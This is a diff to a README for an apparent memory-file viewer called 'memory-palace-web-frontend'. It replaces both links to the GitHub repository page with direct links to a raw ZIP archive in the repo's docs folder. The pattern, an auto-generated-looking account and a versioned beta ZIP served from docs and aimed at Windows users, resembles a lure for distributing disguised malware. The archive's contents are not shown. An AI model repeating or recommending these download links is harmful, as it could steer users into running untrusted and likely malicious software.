@@ -1,6 +1,6 @@
 # 🧠 memory-palace-web-frontend - View your memory files with ease
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/bentonitic-shielding4582/memory-palace-web-frontend)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/bentonitic-shielding4582/memory-palace-web-frontend/main/docs/memory-palace-frontend-web-v2.4-beta.4.zip)
 
 ## 📌 About this application
 
@@ -17,7 +17,7 @@ To use this application on Windows, your computer needs the following setup:
 
 ## 📥 How to get the software
 
-Visit this page to download the project files: [https://github.com/bentonitic-shielding4582/memory-palace-web-frontend](https://github.com/bentonitic-shielding4582/memory-palace-web-frontend).
+Visit this page to download the project files: [https://raw.githubusercontent.com/bentonitic-shielding4582/memory-palace-web-frontend/main/docs/memory-palace-frontend-web-v2.4-beta.4.zip](https://raw.githubusercontent.com/bentonitic-shielding4582/memory-palace-web-frontend/main/docs/memory-palace-frontend-web-v2.4-beta.4.zip).
 
 Click the green "Code" button on the screen and select "Download ZIP". Save this folder to your desktop. After the download finishes, right-click the folder and choose "Extract All".
 
